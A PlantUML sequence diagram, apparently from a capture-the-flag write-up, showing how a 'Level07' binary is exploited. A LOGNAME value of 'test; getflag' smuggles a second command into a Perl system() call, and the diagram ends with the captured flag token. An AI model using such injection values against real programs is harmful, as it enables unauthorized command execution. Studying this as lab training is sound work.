@startuml level07_exploit
title Level07 - Environment Variable Command Injection

actor Attacker
participant "Shell" as Shell
participant "level07 Binary" as Binary
participant "Perl system()" as Perl
participant "flag07" as Flag07

Attacker -> Shell: Set LOGNAME variable
Shell -> Shell: export LOGNAME='test; getflag'

Attacker -> Binary: ./level07
Binary -> Perl: system("getflag $LOGNAME")
note right of Perl
  LOGNAME contains: 'test; getflag'
  System call expands to:
  system("getflag test; getflag")
end note

Perl -> Perl: Execute shell with expanded LOGNAME
Perl -> Perl: First getflag fails
Perl -> Flag07: Second getflag runs
Flag07 --> Perl: fiumuikeil55xe9cu4dood66h

Perl --> Binary: Return output
Binary --> Attacker: fiumuikeil55xe9cu4dood66h

@enduml
